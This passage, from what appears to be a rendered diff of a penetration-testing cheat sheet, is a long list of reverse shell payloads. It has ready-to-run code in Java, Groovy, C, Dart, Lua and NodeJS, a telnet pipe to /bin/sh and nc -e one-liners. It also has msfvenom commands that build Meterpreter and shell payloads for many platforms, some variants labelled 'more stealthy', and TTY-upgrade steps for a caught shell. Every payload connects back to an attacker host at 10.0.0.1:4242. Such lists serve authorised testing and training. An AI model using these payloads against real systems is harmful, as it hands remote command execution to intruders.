style="color:#a6e22e">available</span><span style="color:#f92672">()&gt;</span><span style="color:#ae81ff">0</span><span style="color:#f92672">)</span>po<span style="color:#f92672">.</span><span style="color:#a6e22e">write</span><span style="color:#f92672">(</span>si<span style="color:#f92672">.</span><span style="color:#a6e22e">read</span><span style="color:#f92672">());</span>so<span style="color:#f92672">.</span><span style="color:#a6e22e">flush</span><span style="color:#f92672">();</span>po<span style="color:#f92672">.</span><span style="color:#a6e22e">flush</span><span style="color:#f92672">();</span>Thread<span style="color:#f92672">.</span><span style="color:#a6e22e">sleep</span><span style="color:#f92672">(</span><span style="color:#ae81ff">50</span><span style="color:#f92672">);</span><span style="color:#66d9ef">try</span> <span style="color:#f92672">{</span>p<span style="color:#f92672">.</span><span style="color:#a6e22e">exitValue</span><span style="color:#f92672">();</span><span style="color:#66d9ef">break</span><span style="color:#f92672">;}</span><span style="color:#66d9ef">catch</span> <span style="color:#f92672">(</span>Exception e<span style="color:#f92672">){}};</span>p<span style="color:#f92672">.</span><span style="color:#a6e22e">destroy</span><span style="color:#f92672">();</span>s<span style="color:#f92672">.</span><span style="color:#a6e22e">close</span><span style="color:#f92672">();</span>
+</span></span></code></pre></div><h4 id="java-alternative-2">
+  Java Alternative 2
+  <a class="anchor" href="#java-alternative-2">#</a>
+</h4>
+<p><strong>NOTE</strong>: This is more stealthy</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>Thread thread <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> Thread<span style="color:#f92672">(){</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">run</span><span style="color:#f92672">(){</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// Reverse shell here
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>thread<span style="color:#f92672">.</span><span style="color:#a6e22e">start</span><span style="color:#f92672">();</span>
+</span></span></code></pre></div><h3 id="telnet">
+  Telnet
+  <a class="anchor" href="#telnet">#</a>
+</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>In Attacker machine start two listeners:
+</span></span><span style="display:flex;"><span>nc -lvp <span style="color:#ae81ff">8080</span>
+</span></span><span style="display:flex;"><span>nc -lvp <span style="color:#ae81ff">8081</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>In Victime machine run below command:
+</span></span><span style="display:flex;"><span>telnet &lt;Your_IP&gt; <span style="color:#ae81ff">8080</span> | /bin/sh | telnet &lt;Your_IP&gt; <span style="color:#ae81ff">8081</span>
+</span></span></code></pre></div><h3 id="war">
+  War
+  <a class="anchor" href="#war">#</a>
+</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>msfvenom <span style="color:#f92672">-</span>p java<span style="color:#f92672">/</span>jsp_shell_reverse_tcp LHOST<span style="color:#f92672">=</span><span style="color:#ae81ff">10.0.0.1</span> LPORT<span style="color:#f92672">=</span><span style="color:#ae81ff">4242</span> <span style="color:#f92672">-</span>f war <span style="color:#f92672">&gt;</span> reverse<span style="color:#f92672">.</span><span style="color:#a6e22e">war</span>
+</span></span><span style="display:flex;"><span>strings reverse<span style="color:#f92672">.</span><span style="color:#a6e22e">war</span> <span style="color:#f92672">|</span> grep jsp <span style="color:#960050;background-color:#1e0010">#</span> in order to get the name of the file
+</span></span></code></pre></div><h3 id="lua">
+  Lua
+  <a class="anchor" href="#lua">#</a>
+</h3>
+<p>Linux only</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>lua -e <span style="color:#e6db74">&#34;require(&#39;socket&#39;);require(&#39;os&#39;);t=socket.tcp();t:connect(&#39;10.0.0.1&#39;,&#39;4242&#39;);os.execute(&#39;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&#39;);&#34;</span>
+</span></span></code></pre></div><p>Windows and Linux</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>lua5.1 -e <span style="color:#e6db74">&#39;local host, port = &#34;10.0.0.1&#34;, 4242 local socket = require(&#34;socket&#34;) local tcp = socket.tcp() local io = require(&#34;io&#34;) tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, &#34;r&#34;) local s = f:read(&#34;*a&#34;) f:close() tcp:send(s) if status == &#34;closed&#34; then break end end tcp:close()&#39;</span>
+</span></span></code></pre></div><h3 id="nodejs">
+  NodeJS
+  <a class="anchor" href="#nodejs">#</a>
+</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span>(<span style="color:#66d9ef">function</span>(){
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">net</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#34;net&#34;</span>),
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">cp</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#34;child_process&#34;</span>),
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">sh</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">cp</span>.<span style="color:#a6e22e">spawn</span>(<span style="color:#e6db74">&#34;/bin/sh&#34;</span>, []);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">client</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">net</span>.<span style="color:#a6e22e">Socket</span>();
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">client</span>.<span style="color:#a6e22e">connect</span>(<span style="color:#ae81ff">4242</span>, <span style="color:#e6db74">&#34;10.0.0.1&#34;</span>, <span style="color:#66d9ef">function</span>(){
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">client</span>.<span style="color:#a6e22e">pipe</span>(<span style="color:#a6e22e">sh</span>.<span style="color:#a6e22e">stdin</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">sh</span>.<span style="color:#a6e22e">stdout</span>.<span style="color:#a6e22e">pipe</span>(<span style="color:#a6e22e">client</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">sh</span>.<span style="color:#a6e22e">stderr</span>.<span style="color:#a6e22e">pipe</span>(<span style="color:#a6e22e">client</span>);
+</span></span><span style="display:flex;"><span>    });
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#e6db74">/a/</span>; <span style="color:#75715e">// Prevents the Node.js application from crashing
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>})();
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">or</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#39;child_process&#39;</span>).<span style="color:#a6e22e">exec</span>(<span style="color:#e6db74">&#39;nc -e /bin/sh 10.0.0.1 4242&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">or</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">-</span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">x</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">global</span>.<span style="color:#a6e22e">process</span>.<span style="color:#a6e22e">mainModule</span>.<span style="color:#a6e22e">require</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">-</span><span style="color:#a6e22e">x</span>(<span style="color:#e6db74">&#39;child_process&#39;</span>).<span style="color:#a6e22e">exec</span>(<span style="color:#e6db74">&#39;nc 10.0.0.1 4242 -e /bin/bash&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">or</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">https</span><span style="color:#f92672">:</span><span style="color:#75715e">//gitlab.com/0x4ndr3/blog/blob/master/JSgen/JSgen.py
+</span></span></span></code></pre></div><h3 id="groovy">
+  Groovy
+  <a class="anchor" href="#groovy">#</a>
+</h3>
+<p>by 
+  <a href="https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76">frohoff</a>
+NOTE: Java reverse shell also work for Groovy</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>String host<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;10.0.0.1&#34;</span><span style="color:#f92672">;</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> port<span style="color:#f92672">=</span><span style="color:#ae81ff">4242</span><span style="color:#f92672">;</span>
+</span></span><span style="display:flex;"><span>String cmd<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;cmd.exe&#34;</span><span style="color:#f92672">;</span>
+</span></span><span style="display:flex;"><span>Process p<span style="color:#f92672">=</span><span style="color:#66d9ef">new</span> ProcessBuilder<span style="color:#f92672">(</span>cmd<span style="color:#f92672">).</span><span style="color:#a6e22e">redirectErrorStream</span><span style="color:#f92672">(</span><span style="color:#66d9ef">true</span><span style="color:#f92672">).</span><span style="color:#a6e22e">start</span><span style="color:#f92672">();</span>Socket s<span style="color:#f92672">=</span><span style="color:#66d9ef">new</span> Socket<span style="color:#f92672">(</span>host<span style="color:#f92672">,</span>port<span style="color:#f92672">);</span>InputStream pi<span style="color:#f92672">=</span>p<span style="color:#f92672">.</span><span style="color:#a6e22e">getInputStream</span><span style="color:#f92672">(),</span>pe<span style="color:#f92672">=</span>p<span style="color:#f92672">.</span><span style="color:#a6e22e">getErrorStream</span><span style="color:#f92672">(),</span> si<span style="color:#f92672">=</span>s<span style="color:#f92672">.</span><span style="color:#a6e22e">getInputStream</span><span style="color:#f92672">();</span>OutputStream po<span style="color:#f92672">=</span>p<span style="color:#f92672">.</span><span style="color:#a6e22e">getOutputStream</span><span style="color:#f92672">(),</span>so<span style="color:#f92672">=</span>s<span style="color:#f92672">.</span><span style="color:#a6e22e">getOutputStream</span><span style="color:#f92672">();</span><span style="color:#66d9ef">while</span><span style="color:#f92672">(!</span>s<span style="color:#f92672">.</span><span style="color:#a6e22e">isClosed</span><span style="color:#f92672">()){</span><span style="color:#66d9ef">while</span><span style="color:#f92672">(</span>pi<span style="color:#f92672">.</span><span style="color:#a6e22e">available</span><span style="color:#f92672">()&gt;</span><span style="color:#ae81ff">0</span><span style="color:#f92672">)</span>so<span style="color:#f92672">.</span><span style="color:#a6e22e">write</span><span style="color:#f92672">(</span>pi<span style="color:#f92672">.</span><span style="color:#a6e22e">read</span><span style="color:#f92672">());</span><span style="color:#66d9ef">while</span><span style="color:#f92672">(</span>pe<span style="color:#f92672">.</span><span style="color:#a6e22e">available</span><span style="color:#f92672">()&gt;</span><span style="color:#ae81ff">0</span><span style="color:#f92672">)</span>so<span style="color:#f92672">.</span><span style="color:#a6e22e">write</span><span style="color:#f92672">(</span>pe<span style="color:#f92672">.</span><span style="color:#a6e22e">read</span><span style="color:#f92672">());</span><span style="color:#66d9ef">while</span><span style="color:#f92672">(</span>si<span style="color:#f92672">.</span><span style="color:#a6e22e">available</span><span style="color:#f92672">()&gt;</span><span style="color:#ae81ff">0</span><span style="color:#f92672">)</span>po<span style="color:#f92672">.</span><span style="color:#a6e22e">write</span><span style="color:#f92672">(</span>si<span style="color:#f92672">.</span><span style="color:#a6e22e">read</span><span style="color:#f92672">());</span>so<span style="color:#f92672">.</span><span style="color:#a6e22e">flush</span><span style="color:#f92672">();</span>po<span style="color:#f92672">.</span><span style="color:#a6e22e">flush</span><span style="color:#f92672">();</span>Thread<span style="color:#f92672">.</span><span style="color:#a6e22e">sleep</span><span style="color:#f92672">(</span><span style="color:#ae81ff">50</span><span style="color:#f92672">);</span><span style="color:#66d9ef">try</span> <span style="color:#f92672">{</span>p<span style="color:#f92672">.</span><span style="color:#a6e22e">exitValue</span><span style="color:#f92672">();</span><span style="color:#66d9ef">break</span><span style="color:#f92672">;}</span><span style="color:#66d9ef">catch</span> <span style="color:#f92672">(</span>Exception e<span style="color:#f92672">){}};</span>p<span style="color:#f92672">.</span><span style="color:#a6e22e">destroy</span><span style="color:#f92672">();</span>s<span style="color:#f92672">.</span><span style="color:#a6e22e">close</span><span style="color:#f92672">();</span>
+</span></span></code></pre></div><h4 id="groovy-alternative-1">
+  Groovy Alternative 1
+  <a class="anchor" href="#groovy-alternative-1">#</a>
+</h4>
+<p><strong>NOTE</strong>: This is more stealthy</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>Thread<span style="color:#f92672">.</span><span style="color:#a6e22e">start</span> <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// Reverse shell here
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#f92672">}</span>
+</span></span></code></pre></div><h3 id="c">
+  C
+  <a class="anchor" href="#c">#</a>
+</h3>
+<p>Compile with <code>gcc /tmp/shell.c --output csh &amp;&amp; csh</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-csharp" data-lang="csharp"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span>include &lt;stdio.h&gt;
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span>include &lt;sys/socket.h&gt;
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span>include &lt;sys/types.h&gt;
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span>include &lt;stdlib.h&gt;
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span>include &lt;unistd.h&gt;
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span>include &lt;netinet/<span style="color:#66d9ef">in</span>.h&gt;
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span>include &lt;arpa/inet.h&gt;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> main(<span style="color:#66d9ef">void</span>){
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">int</span> port = <span style="color:#ae81ff">4242</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">struct</span> <span style="color:#a6e22e">sockaddr_in</span> revsockaddr;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">int</span> sockt = socket(AF_INET, SOCK_STREAM, <span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span>    revsockaddr.sin_family = AF_INET;       
+</span></span><span style="display:flex;"><span>    revsockaddr.sin_port = htons(port);
+</span></span><span style="display:flex;"><span>    revsockaddr.sin_addr.s_addr = inet_addr(<span style="color:#e6db74">&#34;10.0.0.1&#34;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    connect(sockt, (<span style="color:#66d9ef">struct</span> <span style="color:#a6e22e">sockaddr</span> *) &amp;revsockaddr, 
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">sizeof</span>(revsockaddr));
+</span></span><span style="display:flex;"><span>    dup2(sockt, <span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span>    dup2(sockt, <span style="color:#ae81ff">1</span>);
+</span></span><span style="display:flex;"><span>    dup2(sockt, <span style="color:#ae81ff">2</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">char</span> * <span style="color:#66d9ef">const</span> argv[] = {<span style="color:#e6db74">&#34;/bin/sh&#34;</span>, NULL};
+</span></span><span style="display:flex;"><span>    execve(<span style="color:#e6db74">&#34;/bin/sh&#34;</span>, argv, NULL);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;       
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><h3 id="dart">
+  Dart
+  <a class="anchor" href="#dart">#</a>
+</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#f92672">import</span> <span style="color:#960050;background-color:#1e0010">&#39;</span>dart<span style="color:#f92672">:</span>io<span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#f92672">;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> <span style="color:#960050;background-color:#1e0010">&#39;</span>dart<span style="color:#f92672">:</span>convert<span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#f92672">;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>main<span style="color:#f92672">()</span> <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>  Socket<span style="color:#f92672">.</span><span style="color:#a6e22e">connect</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;10.0.0.1&#34;</span><span style="color:#f92672">,</span> <span style="color:#ae81ff">4242</span><span style="color:#f92672">).</span><span style="color:#a6e22e">then</span><span style="color:#f92672">((</span>socket<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>    socket<span style="color:#f92672">.</span><span style="color:#a6e22e">listen</span><span style="color:#f92672">((</span>data<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>      Process<span style="color:#f92672">.</span><span style="color:#a6e22e">start</span><span style="color:#f92672">(</span><span style="color:#960050;background-color:#1e0010">&#39;</span>powershell<span style="color:#f92672">.</span><span style="color:#a6e22e">exe</span><span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#f92672">,</span> <span style="color:#f92672">[]).</span><span style="color:#a6e22e">then</span><span style="color:#f92672">((</span>Process process<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>        process<span style="color:#f92672">.</span><span style="color:#a6e22e">stdin</span><span style="color:#f92672">.</span><span style="color:#a6e22e">writeln</span><span style="color:#f92672">(</span><span style="color:#66d9ef">new</span> String<span style="color:#f92672">.</span><span style="color:#a6e22e">fromCharCodes</span><span style="color:#f92672">(</span>data<span style="color:#f92672">).</span><span style="color:#a6e22e">trim</span><span style="color:#f92672">());</span>
+</span></span><span style="display:flex;"><span>        process<span style="color:#f92672">.</span><span style="color:#a6e22e">stdout</span>
+</span></span><span style="display:flex;"><span>          <span style="color:#f92672">.</span><span style="color:#a6e22e">transform</span><span style="color:#f92672">(</span>utf8<span style="color:#f92672">.</span><span style="color:#a6e22e">decoder</span><span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>          <span style="color:#f92672">.</span><span style="color:#a6e22e">listen</span><span style="color:#f92672">((</span>output<span style="color:#f92672">)</span> <span style="color:#f92672">{</span> socket<span style="color:#f92672">.</span><span style="color:#a6e22e">write</span><span style="color:#f92672">(</span>output<span style="color:#f92672">);</span> <span style="color:#f92672">});</span>
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">});</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">},</span>
+</span></span><span style="display:flex;"><span>    onDone<span style="color:#f92672">:</span> <span style="color:#f92672">()</span> <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>      socket<span style="color:#f92672">.</span><span style="color:#a6e22e">destroy</span><span style="color:#f92672">();</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">});</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">});</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">}</span>
+</span></span></code></pre></div><h2 id="meterpreter-shell">
+  Meterpreter Shell
+  <a class="anchor" href="#meterpreter-shell">#</a>
+</h2>
+<h3 id="windows-staged-reverse-tcp">
+  Windows Staged reverse TCP
+  <a class="anchor" href="#windows-staged-reverse-tcp">#</a>
+</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>msfvenom -p windows/meterpreter/reverse_tcp LHOST=<span style="color:#ae81ff">10.0</span>.0.1 LPORT=<span style="color:#ae81ff">4242</span> <span style="color:#f92672">-f</span> exe &gt; reverse.exe
+</span></span></code></pre></div><h3 id="windows-stageless-reverse-tcp">
+  Windows Stageless reverse TCP
+  <a class="anchor" href="#windows-stageless-reverse-tcp">#</a>
+</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>msfvenom -p windows/shell_reverse_tcp LHOST=<span style="color:#ae81ff">10.0</span>.0.1 LPORT=<span style="color:#ae81ff">4242</span> <span style="color:#f92672">-f</span> exe &gt; reverse.exe
+</span></span></code></pre></div><h3 id="linux-staged-reverse-tcp">
+  Linux Staged reverse TCP
+  <a class="anchor" href="#linux-staged-reverse-tcp">#</a>
+</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<span style="color:#ae81ff">10.0</span>.0.1 LPORT=<span style="color:#ae81ff">4242</span> <span style="color:#f92672">-f</span> elf &gt;reverse.elf
+</span></span></code></pre></div><h3 id="linux-stageless-reverse-tcp">
+  Linux Stageless reverse TCP
+  <a class="anchor" href="#linux-stageless-reverse-tcp">#</a>
+</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>msfvenom -p linux/x86/shell_reverse_tcp LHOST=<span style="color:#ae81ff">10.0</span>.0.1 LPORT=<span style="color:#ae81ff">4242</span> <span style="color:#f92672">-f</span> elf &gt;reverse.elf
+</span></span></code></pre></div><h3 id="other-platforms">
+  Other platforms
+  <a class="anchor" href="#other-platforms">#</a>
+</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>$ msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<span style="color:#e6db74">&#34;10.0.0.1&#34;</span> LPORT=<span style="color:#ae81ff">4242</span> <span style="color:#f92672">-f</span> elf &gt; shell.elf
+</span></span><span style="display:flex;"><span>$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=<span style="color:#e6db74">&#34;10.0.0.1&#34;</span> LPORT=<span style="color:#ae81ff">4242</span> <span style="color:#f92672">-f</span> exe &gt; shell.exe
+</span></span><span style="display:flex;"><span>$ msfvenom -p osx/x86/shell_reverse_tcp LHOST=<span style="color:#e6db74">&#34;10.0.0.1&#34;</span> LPORT=<span style="color:#ae81ff">4242</span> <span style="color:#f92672">-f</span> macho &gt; shell.macho
+</span></span><span style="display:flex;"><span>$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=<span style="color:#e6db74">&#34;10.0.0.1&#34;</span> LPORT=<span style="color:#ae81ff">4242</span> <span style="color:#f92672">-f</span> asp &gt; shell.asp
+</span></span><span style="display:flex;"><span>$ msfvenom -p java/jsp_shell_reverse_tcp LHOST=<span style="color:#e6db74">&#34;10.0.0.1&#34;</span> LPORT=<span style="color:#ae81ff">4242</span> <span style="color:#f92672">-f</span> raw &gt; shell.jsp
+</span></span><span style="display:flex;"><span>$ msfvenom -p java/jsp_shell_reverse_tcp LHOST=<span style="color:#e6db74">&#34;10.0.0.1&#34;</span> LPORT=<span style="color:#ae81ff">4242</span> <span style="color:#f92672">-f</span> war &gt; shell.war
+</span></span><span style="display:flex;"><span>$ msfvenom -p cmd/unix/reverse_python LHOST=<span style="color:#e6db74">&#34;10.0.0.1&#34;</span> LPORT=<span style="color:#ae81ff">4242</span> <span style="color:#f92672">-f</span> raw &gt; shell.py
+</span></span><span style="display:flex;"><span>$ msfvenom -p cmd/unix/reverse_bash LHOST=<span style="color:#e6db74">&#34;10.0.0.1&#34;</span> LPORT=<span style="color:#ae81ff">4242</span> <span style="color:#f92672">-f</span> raw &gt; shell.sh
+</span></span><span style="display:flex;"><span>$ msfvenom -p cmd/unix/reverse_perl LHOST=<span style="color:#e6db74">&#34;10.0.0.1&#34;</span> LPORT=<span style="color:#ae81ff">4242</span> <span style="color:#f92672">-f</span> raw &gt; shell.pl
+</span></span><span style="display:flex;"><span>$ msfvenom -p php/meterpreter_reverse_tcp LHOST=<span style="color:#e6db74">&#34;10.0.0.1&#34;</span> LPORT=<span style="color:#ae81ff">4242</span> <span style="color:#f92672">-f</span> raw &gt; shell.php; cat shell.php | pbcopy &amp;&amp; echo <span style="color:#e6db74">&#39;&lt;?php &#39;</span> | tr -d <span style="color:#e6db74">&#39;\n&#39;</span> &gt; shell.php &amp;&amp; pbpaste &gt;&gt; shell.php
+</span></span></code></pre></div><h2 id="spawn-tty-shell">
+  Spawn TTY Shell
+  <a class="anchor" href="#spawn-tty-shell">#</a>
+</h2>
+<p>In order to catch a shell, you need to listen on the desired port. <code>rlwrap</code> will enhance the shell, allowing you to clear the screen with <code>[CTRL] + [L]</code>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>rlwrap nc <span style="color:#ae81ff">10.0</span>.0.1 <span style="color:#ae81ff">4242</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>rlwrap -r <span style="color:#f92672">-f</span> . nc <span style="color:#ae81ff">10.0</span>.0.1 <span style="color:#ae81ff">4242</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">-f</span> . will make rlwrap use the current history file as a completion word list.
+</span></span><span style="display:flex;"><span>-r Put all words seen on <span style="color:#66d9ef">in</span>- and output on the completion list.
+</span></span></code></pre></div><p>Sometimes, you want to access shortcuts, su, nano and autocomplete in a partially tty shell.</p>
+<p>:warning: OhMyZSH might break this trick, a simple <code>sh</code> is recommended</p>
+<blockquote>
+<p>The main problem here is that zsh doesn&rsquo;t handle the stty command the same way bash or sh does. [&hellip;] stty raw -echo; fg[&hellip;] If you try to execute this as two separated commands, as soon as the prompt appear for you to execute the fg command, your -echo command already lost its effect</p>
+</blockquote>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>ctrl+z
+</span></span><span style="display:flex;"><span>echo $TERM &amp;&amp; tput lines &amp;&amp; tput cols
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># for bash</span>
+</span></span><span style="display:flex;"><span>stty raw -echo
+</span></span><span style="display:flex;"><span>fg
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># for zsh</span>
+</span></span><span style="display:flex;"><span>stty raw -echo; fg
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>reset
+</span></span><span style="display:flex;"><span>export SHELL=bash
+</span></span><span style="display:flex;"><span>export TERM=xterm-256color
+</span></span><span style="display:flex;"><span>stty rows &lt;num&gt; columns &lt;cols&gt;
+</span></span></code></pre></div><p>or use <code>socat</code> binary to get a fully tty reverse shell</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>socat file:<span style="color:#e6db74">`</span>tty<span style="color:#e6db74">`</span>,raw,echo<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span> tcp-listen:12345
+</span></span></code></pre></div><p>Spawn a TTY shell from an interpreter</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>/bin/sh -i
+</span></span><span style="display:flex;"><span>python3 -c <span style="color:#e6db74">&#39;import pty; pty.spawn(&#34;/bin/sh&#34;)&#39;</span>
